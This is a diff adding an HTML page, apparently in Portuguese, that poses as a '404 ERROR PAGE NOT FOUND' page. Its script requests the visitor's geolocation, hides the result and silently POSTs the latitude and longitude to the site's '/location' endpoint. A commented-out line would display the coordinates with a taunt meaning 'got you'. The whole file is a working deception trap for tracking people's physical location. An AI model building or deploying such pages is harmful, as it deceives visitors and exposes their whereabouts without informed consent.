@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 ERROR PAGE NOT FOUND</title>
+</head>
+<body>
+    <h1>404 ERROR PAGE NOT FOUND</h1>
+    <p id="status"></p>
+
+    <script>
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+                    document.getElementById("status").innerText = ``;
+                    // document.getElementById("status").innerText = `Latitude: ${latitude}, Longitude: ${longitude}. Peguei ocê uai.`;
+
+                    fetch("/location", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ latitude: latitude, longitude: longitude })
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log(data));
+                },
+                function(error) {
+                    document.getElementById("status").innerText = "Erro ao obter localização!";
+                    console.error(error);
+                }
+            );
+        } else {
+            document.getElementById("status").innerText = "Geolocalização não suportada pelo navegador.";
+        }
+    </script>
+</body>
+</html>
